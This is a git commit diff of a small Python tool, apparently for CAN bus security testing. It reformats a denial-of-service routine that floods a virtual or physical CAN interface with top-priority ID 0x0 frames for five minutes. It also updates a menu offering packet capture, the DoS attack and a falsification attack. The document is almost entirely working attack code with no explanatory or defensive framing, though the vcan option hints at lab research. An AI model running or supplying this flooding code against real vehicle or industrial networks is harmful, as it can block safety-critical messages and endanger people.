422e150d57288c29d0802bc70234bc5fe7798700
Raul Coelho <raulpereira5@gmail.com>
2023-09-06 14:58:22 -0300

    new dos

--- DoS/dos.py
+++ DoS/dos.py
@@ -1,29 +1,28 @@
 import can
+import time
+
 
 def dos_attack(can_type):
-    print('Initialing DoS Attack')
-	
-    if(can_type == '1'):
-    	bus = can.interface.Bus(interface='socketcan', channel='vcan0', bitrate=500000)
+    print("Initialing DoS Attack")
+
+    if can_type == "1":
+        bus = can.interface.Bus(interface="socketcan", channel="vcan0", bitrate=500000)
     else:
-    	bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000)
-    
-    count = 0
-    while count <= 10000:
+        bus = can.interface.Bus(interface="socketcan", channel="can0", bitrate=500000)
+
+    init_time = time.time()
+
+    while time.time() - init_time <= 300:
         try:
             msg = can.Message(
-                arbitration_id=0x0,
-                data=[0, 0, 0, 0, 0, 0, 0, 0],
-                is_extended_id=False
+                arbitration_id=0x0, data=[0, 0, 0, 0, 0, 0, 0, 0], is_extended_id=False
             )
-            bus.send(msg, 0.005)   
+            bus.send(msg, 0.005)
         except can.CanOperationError:
-            print('Except: CanOperationError')
+            print("Except: CanOperationError")
         except:
-            print('Unkown Error Sending Can Msg')
+            print("Unkown Error Sending Can Msg")
         else:
-            count += 1
-
-    print('DoS Attack Done')
+            time.sleep(0.001)
+    print("DoS Attack Done")
     bus.shutdown()
-    
--- main.py
+++ main.py
@@ -2,27 +2,20 @@ from Capture.capture import capture_can
 from DoS.dos import dos_attack
 import os
 
-f_dict = {
-    '1': capture_can,
-    '2': dos_attack
-}
+f_dict = {"1": capture_can, "2": dos_attack}
 
-if __name__ == '__main__':
-    print(' 1 - vcan0\n',
-          '2 - can0\n')
+if __name__ == "__main__":
+    print(" 1 - vcan0\n", "2 - can0\n")
     can_type = input()
-    
-    if(can_type == '1'):
-    	os.system('sudo modprobe vcan')
-    	os.system('sudo ip link add dev vcan0 type vcan')
-    	os.system('sudo ip link set up vcan0')   
-    else:
-    	os.system('sudo ip link set can0 up type can bitrate 500000')    
-      
 
-    print(' 1 - Captura de pacotes\n',
-          '2 - DoS Attack\n',
-          '3 - Falsify Attack')
-    
+    if can_type == "1":
+        os.system("sudo modprobe vcan")
+        os.system("sudo ip link add dev vcan0 type vcan")
+        os.system("sudo ip link set up vcan0")
+    else:
+        os.system("sudo ip link set can0 up type can bitrate 500000")
+
+    print(" 1 - Captura de pacotes\n", "2 - DoS Attack\n", "3 - Falsify Attack")
+
     op = input()
     f_dict[op](can_type)
